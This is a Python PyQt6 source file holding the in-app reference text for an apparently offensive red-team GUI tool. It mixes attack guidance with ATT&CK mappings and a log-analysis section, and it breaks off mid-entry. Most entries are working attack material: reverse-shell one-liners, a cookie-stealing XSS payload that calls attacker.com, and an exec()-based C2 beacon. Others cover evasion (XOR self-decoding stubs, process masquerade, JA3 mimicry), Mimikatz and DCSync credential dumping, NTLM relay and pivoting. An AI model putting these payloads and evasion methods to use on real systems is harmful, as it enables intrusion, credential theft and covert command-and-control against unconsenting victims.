from __future__ import annotations
import textwrap
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter,
    QTreeWidget, QTreeWidgetItem, QTextEdit, QLineEdit,
    QLabel, QPushButton, QApplication,
)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QColor, QFont

# ── Content database ─────────────────────────────────────────────────────────
# Each entry: ([category, subcategory?, ...], title, body)
_REF: list[tuple[list[str], str, str]] = [

    # ── Quick Start ────────────────────────────────────────────────────────
    (["Quick Start"], "Connecting to a host", textwrap.dedent("""\
        Session > New Connection  (Ctrl+N)

        Fill in:
          Protocol : SSH or WinRM
          Host     : IP or FQDN of the target
          Port     : 22 (SSH) / 5985 (WinRM) / 5986 (WinRM-HTTPS)
          Username : local or domain user  (e.g. domain\\user or user@domain)
          Password : plaintext (sent over encrypted transport)
          OS Type  : Windows / Linux  — drives log collection and analysis

        Click Connect.  The device tree on the left populates automatically.
        Each session opens in its own closable tab; permanent tabs (0-4) are protected.
    """)),

    (["Quick Start"], "Dry-run mode", textwrap.dedent("""\
        Set the environment variable before launching:

            export TERMITE_SUMU_DRY_RUN=1
            python main.py

        In dry-run mode every tool wrapper prints the exact subprocess command
        that WOULD be executed, but executes nothing.  Safe for demos and scope
        verification before a live engagement.
    """)),

    (["Quick Start"], "Keyboard shortcuts", textwrap.dedent("""\
        Ctrl+N   New Connection
        Ctrl+Q   Quit
        F5       Refresh Devices
        Ctrl+L   Collect All Logs
        Ctrl+T   Open SSH Terminal
        Ctrl+R   Reverse Shells tab
        Ctrl+E   Exploit Launcher tab
        Ctrl+G   Red Team Ops tab
        Ctrl+A   Deep Analysis tab
        Ctrl+H   This Reference tab
    """)),

    # ── Reverse Shells ─────────────────────────────────────────────────────
    (["Reverse Shells"], "Listener setup", textwrap.dedent("""\
        Choose a handler type, LHOST, and LPORT, then click Start Listener.

        Supported handlers:
          nc      — netcat  (nc -lvnp <port>)
          socat   — socat TCP-LISTEN:<port>,reuseaddr,fork -
          pwncat  — pwncat-cs -lp <port>
          msfconsole — Metasploit multi/handler (requires msfconsole on PATH)

        The listener runs in a background thread; output streams live into the
        terminal pane on the right.  Click Stop to terminate the process.
    """)),

    (["Reverse Shells"], "One-liner generator", textwrap.dedent("""\
        Select a shell type and click Copy to place the one-liner on the clipboard.

        Shells available (Linux):
          bash    — bash -i >& /dev/tcp/LHOST/LPORT 0>&1
          python3 — python3 -c 'import socket,subprocess,os; ...'
          perl    — perl -e 'use Socket; ...'
          php     — php -r '$sock=fsockopen("LHOST",LPORT); ...'
          ruby    — ruby -rsocket -e '...'
          nc      — nc -e /bin/bash LHOST LPORT
          socat   — socat TCP:LHOST:LPORT EXEC:/bin/bash

        Windows shells:
          powershell — $c=New-Object Net.Sockets.TCPClient(...); ...
          cmd        — cmd.exe /c "..."

        Substitute LHOST / LPORT before deploying.
    """)),

    (["Reverse Shells"], "Evasion options", textwrap.dedent("""\
        The Evasion panel (on the right side of the tab) applies transformations
        to the generated payload before copying:

          Base64 encode      — wraps payload: echo <b64> | base64 -d | bash
          XOR obfuscate      — XOR with random single-byte key; self-decoding Python stub
          PowerShell -Enc    — base64-encode for -EncodedCommand (Windows only)
          String concat      — splits payload into harmless-looking string parts
          Process masquerade — prepend exec -a '<name>' to disguise /proc cmdline
          JA3 cipher shuffle — reorder TLS cipher list to mimic benign process
          HTTP beacon        — wrap in User-Agent / timing loop to blend C2 traffic

        Multiple transforms can be stacked.  XOR and process masquerade are
        mutually exclusive on Linux (quoting conflict — tool auto-skips masquerade).
    """)),

    # ── Exploit Launcher ───────────────────────────────────────────────────
    (["Exploit Launcher", "Nmap"], "Nmap scanner", textwrap.dedent("""\
        Form fields:
          Target  : IP, FQDN, or CIDR (e.g. 10.0.0.0/24)
          Ports   : comma/dash list (e.g. 22,80,443,8080-8090) or blank for top 1000
          Options : -sV -sC -O -A --script vuln  (any nmap flags)

        Output streams live into the right pane.
        Results are saved to logs/<session>/nmap_<timestamp>.txt

        Common flag combos:
          -sS -sV -sC -O -p-               full stealth scan all ports
          --script vuln,auth,default        vuln + auth + default scripts
          -sU --top-ports 200               top 200 UDP ports
          -sn 10.0.0.0/24                   ping sweep (host discovery only)
    """)),

    (["Exploit Launcher", "CrackMapExec"], "CrackMapExec", textwrap.dedent("""\
        Form fields:
          Target  : IP / CIDR
          User    : single username
          Pass    : password or NTLM hash (:HASH)
          Module  : smb | winrm | ldap | mssql | rdp | ssh
          Extra   : --shares --sessions --disks --loggedon-users --sam --lsa

        Examples:
          cme smb 10.0.0.0/24 -u admin -p 'P@ss' --shares
          cme smb dc01 -u admin -H aad3b... --sam
          cme winrm target -u user -p pass -x 'whoami'
          cme ldap dc01 -u user -p pass --users --groups

        SMB null session (no creds):
          cme smb target -u '' -p '' --shares
    """)),

    (["Exploit Launcher", "evil-winrm"], "evil-winrm", textwrap.dedent("""\
        WinRM interactive shell — requires target in Remote Management Users group.

        Form fields:
          Host    : target IP or FQDN
          User    : username
          Auth    : password or NTLM hash
          SSL     : toggle for HTTPS (port 5986)

        Internally runs:
          evil-winrm -i <host> -u <user> -p <pass>
          evil-winrm -i <host> -u <user> -H <hash>   # pass-the-hash

        Tips:
          Upload files  : upload /local/path /remote/path
          Download      : download C:\\remote\\path /local/path
          Load scripts  : menu (type menu inside shell)
    """)),

    (["Exploit Launcher", "Impacket"], "Impacket suite", textwrap.dedent("""\
        Tool selector:
          secretsdump   — dump SAM, LSA secrets, NTDS.dit remotely
          psexec        — interactive SYSTEM shell via SMB
          wmiexec       — semi-interactive shell via WMI (no service created)
          smbexec       — shell via SMB without touching disk
          atexec        — execute command via Task Scheduler
          GetSPNs       — Kerberoasting — request TGS for SPN accounts
          GetNPUsers    — AS-REP roasting — dump hashes for pre-auth disabled accounts
          lookupsid     — enumerate domain SIDs / users via RPC

        Authentication options:
          -hashes LMHASH:NTHASH   — pass-the-hash
          -k                      — Kerberos ticket (set KRB5CCNAME env var first)
          -dc-ip <DC>             — specify domain controller IP

        secretsdump output:
          Administrator:500:aad3b...:31d6c...:::
          Format: user:RID:LM:NT:::
    """)),

    (["Exploit Launcher", "Metasploit"], "Metasploit launcher", textwrap.dedent("""\
        Runs msfconsole with a temporary resource script (no interactive console).

        Form fields:
          Module  : exploit path (e.g. exploit/windows/smb/ms17_010_eternalblue)
          RHOST   : target IP
          RPORT   : target port
          Payload : e.g. windows/x64/meterpreter/reverse_tcp
          LHOST   : your listener IP
          LPORT   : your listener port

        The tool generates a .rc resource script, launches msfconsole -r, and
        streams output live.  All modules run non-interactively.

        Example module paths:
          exploit/multi/handler                  — generic payload handler
          exploit/windows/smb/ms17_010_eternalblue
          auxiliary/scanner/smb/smb_ms17_010
          post/multi/recon/local_exploit_suggester
    """)),

    (["Exploit Launcher", "Hydra"], "Hydra brute force", textwrap.dedent("""\
        Form fields:
          Target   : IP or FQDN
          Port     : service port
          Service  : ssh | ftp | http-post-form | smb | rdp | mysql | ...
          Username : single user or path to username wordlist
          Wordlist : path to password wordlist (e.g. /usr/share/wordlists/rockyou.txt)
          Threads  : parallel tasks (default 16; keep low for rate-limited services)

        Internally:
          hydra -l user -P wordlist -s port -t threads target service

        Tips:
          -L userlist.txt    — multiple usernames
          -u                 — try each password for all users before moving to next
          http-post-form syntax:
            /login:user=^USER^&pass=^PASS^:F=incorrect
    """)),

    # ── Red Team – Active Directory ─────────────────────────────────────────
    (["Red Team", "Active Directory"], "BloodHound collector", textwrap.dedent("""\
        Collects AD object data and writes JSON files for BloodHound ingestion.

        Form fields:
          DC / Target  : domain controller IP
          Domain       : FQDN (corp.local)
          Username / Password
          Collection   : All | DCOnly | Group | LocalAdmin | LoggedOn |
                         ObjectProps | RDP | DCOM | Container | Default

        Internally runs bloodhound-python (Python ingestor):
          bloodhound-python -u user -p pass -d corp.local -c All --zip -dc dc_ip

        Outputs a zip file in logs/<session>/ ready to drag into BloodHound.

        ATT&CK: T1087, T1069 (Account/Group Discovery)
    """)),

    (["Red Team", "Active Directory"], "Kerberoasting", textwrap.dedent("""\
        Request TGS tickets for SPN accounts → crack offline.

        Uses: impacket GetUserSPNs.py

        Form fields:
          DC IP, Domain, Username, Password (or hash)

        Output: Kerberos hash file in $etype $23 format for hashcat.

        Crack with hashcat:
          hashcat -m 13100 hashes.txt rockyou.txt
          hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule

        ATT&CK: T1558.003
        Detection: Event ID 4769 (TGS request), RC4 encryption type (0x17)
    """)),

    (["Red Team", "Active Directory"], "AS-REP Roasting", textwrap.dedent("""\
        Dump hashes for accounts with pre-authentication disabled.

        Uses: impacket GetNPUsers.py  (no credentials required if user list known)

        Form fields:
          DC IP, Domain
          Username list (file) or single username

        Output: $krb5asrep$23$... hashes for hashcat mode 18200.

        Crack:
          hashcat -m 18200 asrep.hashes rockyou.txt

        ATT&CK: T1558.004
        Detection: Event ID 4768, no pre-auth flag in account properties
    """)),

    (["Red Team", "Active Directory"], "DCSync", textwrap.dedent("""\
        Replicate AD hashes without touching LSASS — requires replication rights.

        Uses: impacket secretsdump.py with -just-dc-ntlm

        Required privileges:
          Replicating Directory Changes
          Replicating Directory Changes All
          (Domain Admin, or custom ACL — grant via WriteDACL abuse)

        Form fields:
          DC FQDN, Domain, Username, Password or hash

        Output: NTLM hashes for all domain accounts + krbtgt.

        krbtgt hash → Golden Ticket (valid 10 years).

        ATT&CK: T1003.006
        Detection: Event IDs 4662 (replication rights), unusual replication source
    """)),

    (["Red Team", "Active Directory"], "Pass-the-Hash", textwrap.dedent("""\
        Authenticate using NTLM hash — no plaintext password needed.

        Supported via: evil-winrm, CrackMapExec, Impacket (wmiexec/psexec/smbexec)

        Usage in each tool:
          evil-winrm  -H <NT_HASH>
          cme smb     -H <NT_HASH>
          psexec.py   -hashes :<NT_HASH>  domain/user@target

        ATT&CK: T1550.002
        Detection: Event ID 4624 Type 3, NtLmSsp provider, no Kerberos ticket
    """)),

    (["Red Team", "Active Directory"], "LDAP dump", textwrap.dedent("""\
        Anonymous or authenticated LDAP dump of AD objects.

        Runs: ldapdomaindump -u 'domain\\user' -p pass ldap://dc

        Outputs HTML + JSON files in logs/<session>/ldap/:
          domain_users.json     — all users with attributes
          domain_groups.json    — all groups + members
          domain_computers.json — all computer objects
          domain_policy.json    — default domain policy
          domain_trusts.json    — inter-domain trusts

        Anonymous bind (no creds):
          Leave username/password blank — may still expose user list on misconfigured DCs.

        ATT&CK: T1087.002 (Domain Account Discovery)
    """)),

    # ── Red Team – Network ─────────────────────────────────────────────────
    (["Red Team", "Network"], "Responder / NTLM relay", textwrap.dedent("""\
        Captures NTLMv2 hashes via LLMNR / NBT-NS poisoning.

        Runs: responder -I <interface> -wP

        Form fields:
          Interface : eth0 / tun0 / etc.
          Relay     : toggle ntlmrelayx alongside Responder
          Target file : list of relay targets (one IP per line)

        ntlmrelayx runs in parallel:
          ntlmrelayx.py -tf targets.txt -smb2support

        Captured hashes appear in the output pane and in logs/Responder-Session.log.

        Crack NTLMv2:
          hashcat -m 5600 ntlmv2.hashes rockyou.txt

        ATT&CK: T1557.001
        Detection: LLMNR traffic spikes, unexpected SMB auth from multiple hosts
    """)),

    (["Red Team", "Network"], "Mitm6 (IPv6 MitM)", textwrap.dedent("""\
        Abuses Windows preference for IPv6 to poison DNS and capture auth.

        Runs: mitm6 -d <domain>

        Combine with ntlmrelayx for LDAP relay:
          ntlmrelayx.py -6 -t ldaps://dc -wh wpad.domain.local --delegate-access

        Form fields:
          Domain  : target domain (corp.local)
          Relay target : domain controller IP

        Output: harvested credentials / created LDAP objects in logs/.

        ATT&CK: T1557 (Adversary-in-the-Middle)
        Requires: IPv6 enabled on target subnet (default on Windows)
    """)),

    (["Red Team", "Network"], "PetitPotam coercion", textwrap.dedent("""\
        Coerce DC to authenticate to attacker — triggers NTLM auth capture.

        Runs: python3 PetitPotam.py <attacker_ip> <dc_ip>

        Combine with:
          ntlmrelayx → relay DC auth to ADCS HTTP enrollment (ESC8)
          → obtain DC certificate → PKINIT → dump hashes

        Form fields:
          Attacker IP, Target DC IP
          Optional: ADCS web enrollment URL for ESC8 relay

        ATT&CK: T1187 (Forced Authentication)
        CVE: CVE-2021-36942 (patched — check if unauthenticated coercion works)
    """)),

    (["Red Team", "Network"], "pspy (process watch)", textwrap.dedent("""\
        Monitor Linux processes without root — useful for cron job hunting.

        Runs: pspy64 (or pspy if pspy64 not found on PATH)

        Form fields:
          Interval : milliseconds between scans (default 100)
          Filter   : optional keyword to grep output (e.g. root, /etc/cron)

        What to look for:
          Cron jobs running scripts in writable paths → hijack opportunity
          SUID binaries spawned from non-root context
          Processes clearing logs (rm /var/log/...)
          Admin tools run with credentials in argv (leaked passwords)

        ATT&CK: T1057 (Process Discovery), T1053 (Scheduled Task/Job)
    """)),

    # ── Red Team – Recon ───────────────────────────────────────────────────
    (["Red Team", "Recon"], "Amass subdomain enum", textwrap.dedent("""\
        Passive or active subdomain enumeration.

        Runs: amass enum -d <domain> [-passive]

        Form fields:
          Domain  : target root domain (example.com)
          Mode    : Passive (no direct target interaction) | Active
          Output  : saved to logs/<session>/amass_<domain>.txt

        Passive sources: Certificate Transparency, DNS brute, BGP data,
        ASN lookups, Shodan, Censys, VirusTotal, etc.

        Active mode adds: DNS zone transfers, brute force with built-in wordlist.

        ATT&CK: T1590 (Gather Victim Network Information)
    """)),

    (["Red Team", "Recon"], "Nuclei vulnerability scan", textwrap.dedent("""\
        Template-based fast vulnerability scanner.

        Runs: nuclei -u <target> -t <template_path> [-severity <sev>]

        Form fields:
          Target     : full URL (https://target.com) or bare host
          Templates  : path to nuclei-templates/ directory
          Severity   : critical,high,medium,low,info (comma-separated)

        Common template paths:
          ~/nuclei-templates/               — full community template set
          ~/nuclei-templates/http/cves/     — only CVE templates
          ~/nuclei-templates/network/       — network-layer templates

        Output: JSON findings in logs/<session>/nuclei_<timestamp>.json

        ATT&CK: T1190 (Exploit Public-Facing Application)
    """)),

    (["Red Team", "Recon"], "theHarvester OSINT", textwrap.dedent("""\
        Collect emails, subdomains, hosts, employee names from public sources.

        Runs: theHarvester -d <domain> -b <sources> -l <limit>

        Form fields:
          Domain  : target domain
          Sources : google,bing,linkedin,shodan,certspotter,crtsh,dnsdumpster
          Limit   : max results per source (default 500)

        Useful output:
          Emails     → build phishing target list
          Subdomains → expand attack surface
          Hosts      → live IPs associated with domain
          Employee names → username enumeration

        ATT&CK: T1589 (Gather Victim Identity Information)
    """)),

    (["Red Team", "Recon"], "WhatWeb fingerprint", textwrap.dedent("""\
        Web technology fingerprinting — CMS, frameworks, server versions.

        Runs: whatweb -a 3 <target>

        Form fields:
          Target     : full URL
          Aggression : 1 (stealthy) to 4 (aggressive)

        Output shows:
          Server : Apache 2.4.51, nginx 1.21.6
          CMS    : WordPress 5.9, Drupal 9.3
          JS libs: jQuery 3.6.0, Bootstrap 5.1
          Plugins: Contact Form 7, WooCommerce

        Use findings to:
          Cross-reference with CVE/ExploitDB for version-specific vulns
          Identify outdated plugins as initial access vectors

        ATT&CK: T1592 (Gather Victim Host Information)
    """)),

    (["Red Team", "Recon"], "Gobuster directory brute", textwrap.dedent("""\
        Fast HTTP directory / file brute-forcing.

        Runs: gobuster dir -u <url> -w <wordlist> [options]

        Form fields:
          URL      : target base URL (https://target.com)
          Wordlist : path to wordlist
          Ext      : file extensions (php,html,txt,bak,zip)
          Threads  : parallel requests (default 20)

        Recommended wordlists (SecLists):
          /usr/share/seclists/Discovery/Web-Content/common.txt
          /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
          /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

        Interesting findings:
          /admin, /backup, /.git, /api, /swagger, /phpinfo.php, /wp-admin

        ATT&CK: T1083 (File and Directory Discovery)
    """)),

    (["Red Team", "Recon"], "ffuf fuzzer", textwrap.dedent("""\
        Fast web fuzzer — directories, parameters, virtual hosts, headers.

        Runs: ffuf -u <url> -w <wordlist> [options]

        Form fields:
          URL      : place FUZZ keyword where fuzzing occurs
                     e.g. https://target.com/FUZZ
                     e.g. https://target.com/?id=FUZZ
          Wordlist : path to wordlist
          Filter   : -fc (filter status code), -fs (filter size), -fw (filter words)

        Virtual host discovery:
          ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w vhosts.txt

        Parameter discovery:
          ffuf -u 'https://target.com/page?FUZZ=1' -w params.txt -fs 1234

        ATT&CK: T1083, T1590
    """)),

    # ── Red Team – Web ─────────────────────────────────────────────────────
    (["Red Team", "Web"], "SQLMap injection", textwrap.dedent("""\
        Automated SQL injection detection and exploitation.

        Runs: sqlmap -u <url> [options]

        Form fields:
          Target URL : include parameter (e.g. https://target.com/page?id=1)
          Data       : POST body for POST injection (user=admin&pass=test)
          Options    : --dbs --tables --dump --batch --level=5 --risk=3

        Common workflows:
          Enumerate databases : --dbs --batch
          Dump a table        : -D dbname -T tablename --dump
          OS command (MSSQL)  : --os-cmd=whoami (requires xp_cmdshell)
          File read           : --file-read=/etc/passwd
          File write          : --file-write=shell.php --file-dest=/var/www/html/

        ATT&CK: T1190, T1059 (via xp_cmdshell escalation)
    """)),

    (["Red Team", "Web"], "SSTI / tplmap", textwrap.dedent("""\
        Server-Side Template Injection detection and exploitation.

        Runs: tplmap -u <url> [options]

        Form fields:
          URL    : target URL with parameter (https://target.com/?name=SSTI)
          Method : GET | POST
          Data   : POST body if needed

        Supported engines: Jinja2, Mako, Tornado, Django, Twig, Smarty, etc.

        Detection payloads (manual):
          {{7*7}}       → Jinja2/Twig
          ${7*7}        → Freemarker/Pebble
          #{7*7}        → Ruby ERB
          *{7*7}        → Thymeleaf

        Jinja2 RCE:
          {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

        ATT&CK: T1059 (Command and Scripting Interpreter)
    """)),

    (["Red Team", "Web"], "XSS / param discovery", textwrap.dedent("""\
        Reflected / stored XSS and parameter discovery.

        Parameter discovery:
          Runs: arjun -u <url> --stable

        XSS payloads (manual, paste into parameters):
          Basic:    <script>alert(1)</script>
          IMG:      <img src=x onerror=alert(1)>
          SVG:      <svg onload=alert(1)>
          Cookie steal:
            <script>fetch('https://attacker.com/c?c='+document.cookie)</script>

        DALFOX automated XSS:
          dalfox url https://target.com/?q=FUZZ

        ATT&CK: T1059.007 (JavaScript)
    """)),

    # ── Red Team – Post-Exploitation ───────────────────────────────────────
    (["Red Team", "Post-Exploit"], "SUID finder", textwrap.dedent("""\
        Find SUID/SGID binaries on Linux for local privilege escalation.

        Runs: find / -perm -4000 -type f 2>/dev/null
              find / -perm -2000 -type f 2>/dev/null

        Form fields:
          Target : SSH session (must have active connection)

        Output: list of SUID/SGID binaries in the log pane.

        Cross-reference with GTFOBins (https://gtfobins.github.io):
          Common exploitable SUIDs:
            /usr/bin/find      — find . -exec /bin/sh \\; -quit
            /usr/bin/vim       — vim -c ':!/bin/sh'
            /usr/bin/python3   — python3 -c 'import os;os.execl("/bin/sh","sh")'
            /usr/bin/nmap      — nmap --interactive (old versions)
            /usr/bin/less      — less /etc/passwd  then !/bin/sh

        ATT&CK: T1548.001 (SUID/GUID bit abuse)
    """)),

    (["Red Team", "Post-Exploit"], "WinPEAS / LinPEAS", textwrap.dedent("""\
        Automated privilege escalation enumeration scripts.

        LinPEAS (Linux):
          curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

        WinPEAS (Windows PowerShell):
          IEX (New-Object Net.WebClient).DownloadString('https://.../winPEASany.ps1')

        Or transfer and run:
          Upload via the active session → terminal → run locally

        Key findings to look for:
          [+] Sudo version vulnerable
          [+] Writable /etc/passwd
          [+] Cron job with writable script
          [+] AlwaysInstallElevated registry key
          [+] Unquoted service path
          [+] Credential files found

        ATT&CK: T1068, T1548, T1053
    """)),

    (["Red Team", "Post-Exploit"], "Mimikatz credential dump", textwrap.dedent("""\
        Dump credentials from Windows LSASS memory.

        Requires: SYSTEM or SeDebugPrivilege

        Key commands (run inside meterpreter or evil-winrm session):
          sekurlsa::logonpasswords   — clear-text + NTLM hashes from LSASS
          lsadump::sam               — local SAM database hashes
          lsadump::dcsync /user:krbtgt — DCSync for krbtgt hash (Golden Ticket)
          dpapi::cred                — browser/WiFi/RDP saved credentials
          kerberos::list             — list Kerberos tickets in memory
          kerberos::golden ...       — forge Golden Ticket

        Via Impacket (remote, no binary on disk):
          secretsdump.py domain/admin:pass@target -just-dc-ntlm

        ATT&CK: T1003.001 (LSASS Memory)
        Detection: Event 4656 (LSASS handle), Sysmon EventID 10
    """)),

    (["Red Team", "Post-Exploit"], "Privilege escalation checklist", textwrap.dedent("""\
        Quick checklist — run these commands on a fresh Linux shell:

          id; whoami; groups
          sudo -l                           # sudo rights — any NOPASSWD?
          cat /etc/crontab; ls /etc/cron.*  # cron jobs
          find / -perm -4000 2>/dev/null    # SUID binaries
          find / -writable -type f 2>/dev/null | grep -v proc  # writable files
          env | grep -i pass               # env vars with credentials
          cat ~/.bash_history              # command history
          ss -tlnp                         # listening services (internal only?)
          uname -a                         # kernel version → CVE lookup

        Windows checklist (PowerShell):
          whoami /priv                     # SeImpersonate → Potato attacks
          whoami /groups                   # group memberships
          Get-ChildItem HKLM:\\...\\Run     # auto-run entries
          Get-ScheduledTask               # scheduled tasks
          Get-Service | Where StartType -eq Auto  # auto-start services
          reg query HKCU\\...AlwaysInstallElevated  # MSI privilege check
    """)),

    # ── Red Team – Tunneling ───────────────────────────────────────────────
    (["Red Team", "Tunneling"], "Chisel SOCKS proxy", textwrap.dedent("""\
        TCP/UDP tunneling through firewalls — reverse SOCKS5 proxy.

        Attacker (server):
          ./chisel server -p 8080 --reverse

        Target (client):
          ./chisel client attacker_ip:8080 R:1080:socks

        Route Impacket through the tunnel:
          proxychains4 secretsdump.py domain/user:pass@internal_host

        Configure /etc/proxychains4.conf:
          [ProxyList]
          socks5 127.0.0.1 1080

        Form fields:
          Mode       : Server | Client
          Listen port: port for server / connect port for client
          SOCKS port : local SOCKS5 port (default 1080)

        ATT&CK: T1572 (Protocol Tunneling), T1090 (Proxy)
    """)),

    (["Red Team", "Tunneling"], "SSH dynamic port forward", textwrap.dedent("""\
        Built-in SSH SOCKS5 proxy — no extra tools needed.

        Command:
          ssh -D 1080 -N -f user@pivot_host

          -D 1080  : local SOCKS5 proxy on port 1080
          -N       : no remote command (tunnel only)
          -f       : run in background

        Then:
          proxychains4 nmap -sT -p 22,80,443 internal_host

        Local port forward (specific port):
          ssh -L 8080:internal_web:80 user@pivot_host

        Remote port forward (expose attacker service inside network):
          ssh -R 4444:0.0.0.0:4444 user@pivot_host

        ATT&CK: T1572, T1021.004 (SSH)
    """)),

    (["Red Team", "Tunneling"], "Ligolo-ng agent tunnel", textwrap.dedent("""\
        Transparent kernel-level tunnel — routes entire subnet without proxychains.

        Attacker (proxy server):
          ./proxy -selfcert -laddr 0.0.0.0:11601

        Target (agent):
          ./agent -connect attacker_ip:11601 -ignore-cert

        In Ligolo-ng proxy interface:
          session              # select agent session
          ifconfig             # view agent's network interfaces
          listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321  # port forward
          start                # bring up tun0 interface

        Add route on attacker:
          ip route add 10.10.10.0/24 dev ligolo

        Then use tools natively — no proxychains needed.

        ATT&CK: T1572, T1090
    """)),

    (["Red Team", "Tunneling"], "netsh port proxy (Windows)", textwrap.dedent("""\
        Native Windows port proxy — no extra binaries.

        Forward local port to internal service:
          netsh interface portproxy add v4tov4 ^
            listenaddress=0.0.0.0 listenport=4444 ^
            connectaddress=10.10.10.5 connectport=445

        List all rules:
          netsh interface portproxy show all

        Remove a rule:
          netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0

        Use case: pivot through a Windows host to reach an internal RDP/SMB service
        when no Chisel/Ligolo binary is available.

        ATT&CK: T1090.001 (Internal Proxy)
    """)),

    # ── Evasion Engine ─────────────────────────────────────────────────────
    (["Evasion Engine"], "Transform overview", textwrap.dedent("""\
        The evasion module (core/evasion.py) applies layered transforms.
        All transforms are stackable unless noted.

        Available transforms:
          base64_encode      — wraps in echo <b64> | base64 -d | bash
          obfuscate_xor      — XOR with random key; Python self-decoding stub
          powershell_enc     — -EncodedCommand base64 for PowerShell (Windows)
          string_concat      — splits string into harmless-looking fragments
          process_masquerade — exec -a 'name' (Linux only, conflicts with XOR)
          ja3_shuffle        — reorder TLS ciphers (OpenSSL s_client template)
          http_beacon        — wrap in User-Agent / sleep loop

        All transforms are applied in EvasionConfig order:
          1. XOR / base64 (payload encoding)
          2. String concat (token splitting)
          3. PowerShell -Enc wrapper
          4. Process masquerade prepend
          5. JA3 shuffle header
          6. HTTP beacon wrapper

        Detection timer: measures seconds from payload send to first alert.
    """)),

    (["Evasion Engine"], "XOR obfuscation", textwrap.dedent("""\
        Applies single-byte XOR with a random key (0-255), generates a Python
        self-decoding stub that XORs back and pipes to bash.

        Output format:
          python3 -c "
          import sys
          k=<key>
          d=bytes([b^k for b in <encrypted_bytes>])
          import subprocess; subprocess.run(['bash','-c',d.decode()])
          "

        The key is random per call — each invocation produces unique output.
        Combined with base64 wrapping: result is base64(xor(payload)).

        Note: XOR and process_masquerade are mutually exclusive on Linux
        because the XOR output already contains double quotes that conflict
        with the bash_snippet wrapping.
    """)),

    (["Evasion Engine"], "Detection timer", textwrap.dedent("""\
        Measures detection latency for blue team assessment.

        Workflow:
          1. Generate evasion payload via the Evasion tab
          2. Enable Detection Timer toggle
          3. Execute payload against target in a controlled test
          4. When blue team alert fires: click Stop Timer
          5. Timer records seconds from payload execution to first detection

        The result feeds into the Analysis tab's detection latency report.

        Use this to quantify:
          - SIEM alert delay (event ingestion → rule match → alert)
          - EDR response time (execution → quarantine)
          - SOC response time (alert → analyst action)

        Document baseline detection latency per payload type in the engagement report.
    """)),

    (["Evasion Engine"], "JA3 cipher shuffle", textwrap.dedent("""\
        Generates an OpenSSL s_client command with cipher suites reordered
        to produce a specific JA3 fingerprint — useful for blending C2 traffic
        with legitimate application fingerprints.

        JA3 is calculated from:
          TLS version + Ciphers + Extensions + Elliptic curves + EC point formats

        Common legitimate JA3 hashes to mimic:
          Firefox 96:   cd08e31494f9531f560d64c695473da9
          Chrome 96:    b32309a26951912be7dba376398abc3b
          curl 7.82:    eb1d94daa7e0344597e756a1fb6d7048

        The generated command sets -cipher <shuffled_list> to adjust the cipher
        component of the JA3 hash.  Full JA3 matching requires also adjusting
        TLS extensions (not currently automated).
    """)),

    (["Evasion Engine"], "HTTP beacon disguise", textwrap.dedent("""\
        Wraps the C2 callback in a loop that mimics a legitimate software update
        or analytics beacon:

          while True:
              try:
                  r = requests.get('<c2_url>',
                      headers={'User-Agent': '<legitimate_UA>',
                               'Accept': 'application/json'},
                      timeout=10)
                  if r.status_code == 200:
                      exec(r.text)   # receive tasking
              except:
                  pass
              time.sleep(<interval> + random.uniform(-<jitter>, <jitter>))

        Configurable:
          User-Agent : any string (default: mimics Chrome on Windows)
          Interval   : sleep seconds between calls (default 60)
          Jitter     : ±seconds of random variance to avoid fixed-interval detection

        ATT&CK: T1071.001 (Web Protocols), T1102 (Web Service for C2)
    """)),

    # ── Log Analysis ───────────────────────────────────────────────────────
    (["Log Analysis"], "Collecting logs", textwrap.dedent("""\
        Tools > Collect All Logs  (Ctrl+L) — or toolbar button.

        Requires an active session.  OS type set at connection time determines
        which log sources are collected:

        Linux log sources:
          /var/log/auth.log         — authentication events
          /var/log/syslog           — system messages
          /var/log/kern.log         — kernel messages
          journalctl -n 5000        — systemd journal (last 5000 entries)
          /var/log/apache2/         — web server (if present)
          /var/log/nginx/           — nginx access/error (if present)

        Windows log sources (via WinRM PowerShell):
          Security event log        — 4624,4625,4648,4672,4688,4698,4720,4768,4769
          System event log          — 7045 (service install)
          Application event log     — application errors

        Entries are saved to logs/<session>/<timestamp>/ as JSON and text.
        They are also loaded into the Logs pane and the Analysis tab automatically.
    """)),

    (["Log Analysis"], "MITRE ATT&CK signature scan", textwrap.dedent("""\
        Analysis tab > Run Deep Scan

        The analyzer applies 30 built-in signatures:
          15 Linux signatures:
            SSH brute force (T1110.003)
            Sudo privilege escalation (T1548.001)
            SUID binary creation (T1548.001)
            Cron persistence (T1053.003)
            New user creation (T1136.001)
            Reverse shell indicators (T1059.004)
            Passwd file modification (T1098)
            Log file deletion (T1070.002)
            Python/Perl spawning shell (T1059)
            ... and 6 more

          15 Windows signatures:
            Event 4625 brute force (T1110)
            Event 4698 scheduled task persistence (T1053.005)
            Event 4720 user creation (T1136.001)
            Event 4769 Kerberoasting RC4 (T1558.003)
            Event 4768 AS-REP roast (T1558.004)
            Mimikatz process name (T1003.001)
            LSASS access (T1003.001)
            PowerShell -Enc (T1027)
            ... and 7 more

          3 anomaly detectors:
            Off-hours logon bursts
            Login from new geographic source
            High-volume select queries (exfil indicator)

        Each finding includes: timestamp, matched line, ATT&CK technique ID, severity.
    """)),

    (["Log Analysis"], "Exporting results", textwrap.dedent("""\
        Export > Export Logs as PDF   — generates reportlab PDF
        Export > Export Logs as JSON  — structured JSON file
        Export > Export Analysis JSON — findings from last deep scan

        PDF report includes:
          Cover page with host, date, classification
          Summary table: total events, finding counts by severity
          Full log table: timestamp | source | level | message
          Findings section: each ATT&CK finding with evidence

        JSON format (logs):
          [{"timestamp": "...", "source": "auth.log",
            "level": "ERROR", "message": "..."}, ...]

        JSON format (analysis):
          [{"rule": "SSH Brute Force", "technique": "T1110.003",
            "severity": "High", "evidence": "...", "timestamp": "..."}, ...]

        Files saved to: logs/<session>/exports/
    """)),

    (["Log Analysis"], "Filtering and searching", textwrap.dedent("""\
        Log Viewer panel (right pane of session tab):

          Filter bar : type text → filters log entries by message content in real-time
          Level filter : ERROR | WARN | INFO | DEBUG (click to toggle)
